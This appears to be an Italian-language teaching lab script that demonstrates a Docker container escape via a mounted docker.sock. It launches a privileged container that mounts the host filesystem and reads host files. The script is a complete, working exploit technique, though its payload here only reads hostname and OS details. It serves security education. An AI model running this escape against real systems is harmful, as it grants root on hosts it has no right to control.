#!/bin/bash
# 02_docker_sock_escape.sh — Container escape via docker.sock
#
# Se monti /var/run/docker.sock dentro un container, quel container
# controlla il demone Docker. Puo' creare nuovi container privilegiati,
# montare il filesystem host, eseguire comandi come root.
#
# Questo e' il pattern piu' comune nei setup CI/CD (Jenkins, GitLab Runner).
#
# Uso:
#     chmod +x 02_docker_sock_escape.sh
#     ./02_docker_sock_escape.sh

set -e

SEP="============================================================"

echo ""
echo "$SEP"
echo "  STEP 1: Container con docker.sock montato"
echo "$SEP"
echo ""
echo "> Simula un setup CI/CD: container con accesso al Docker daemon..."
echo ""

# Installiamo curl nel container per parlare con il Docker socket
docker run --rm -v /var/run/docker.sock:/var/run/docker.sock alpine sh -c '
    apk add --no-cache curl > /dev/null 2>&1

    echo "--- Chi sono dentro il container? ---"
    echo "Hostname: $(hostname)"
    echo "User: $(whoami)"
    echo ""

    echo "--- Parlo con il Docker daemon via socket ---"
    echo ""

    echo "> GET /version"
    curl -s --unix-socket /var/run/docker.sock http://localhost/version | head -c 200
    echo ""
    echo ""

    echo "> GET /containers/json (lista container attivi)"
    CONTAINERS=$(curl -s --unix-socket /var/run/docker.sock http://localhost/containers/json)
    echo "$CONTAINERS" | head -c 300
    echo ""
    echo ""

    echo "--- Cosa potrei fare da qui ---"
    echo "[!] POST /containers/create con Binds: [\"/:/host\"] e Privileged: true"
    echo "[!] = creo un container che monta tutto il filesystem host"
    echo "[!] = eseguo comandi come root sull'"'"'host"
    echo "[!] = game over"
    echo ""
    echo "[!] Non lo faccio per davvero in questo lab, ma il punto e'"'"' chiaro:"
    echo "[!] docker.sock = chiavi del regno."
'

echo ""
echo "$SEP"
echo "  STEP 2: La prova — creo un container dall'interno"
echo "$SEP"
echo ""
echo "> Dall'interno del container, creo un ALTRO container che legge l'host..."
echo ""

cat > /tmp/_inner_escape.sh << 'INNER'
echo "[+] Container figlio creato con successo"
echo "[+] Filesystem host montato su /host"
echo ""
echo "--- /host/etc/hostname ---"
cat /host/etc/hostname 2>/dev/null || echo "(non trovato)"
echo ""
echo "--- /host/etc/os-release ---"
cat /host/etc/os-release 2>/dev/null | head -3
echo ""
echo "[!] ESCAPE COMPLETO: dal container originale, attraverso il socket,"
echo "[!] ho creato un container privilegiato con accesso all'host."
INNER

cat > /tmp/_sock_escape.sh << 'OUTER'
echo "[*] Sono dentro un container. Creo un altro container privilegiato..."
echo ""
docker run --rm --privileged -v /:/host alpine sh -c "$(cat /tmp/_inner_escape.sh)"
OUTER

docker run --rm \
    -v /var/run/docker.sock:/var/run/docker.sock \
    -v /tmp/_sock_escape.sh:/run.sh:ro \
    -v /tmp/_inner_escape.sh:/tmp/_inner_escape.sh:ro \
    docker:cli sh /run.sh

echo ""
echo "$SEP"
echo "  RISULTATO"
echo "$SEP"
echo ""
echo "docker.sock montato = root sull'host."
echo "Lo trovi in: Jenkins, GitLab CI, GitHub Actions self-hosted,"
echo "qualsiasi setup Docker-in-Docker fatto male."
echo ""
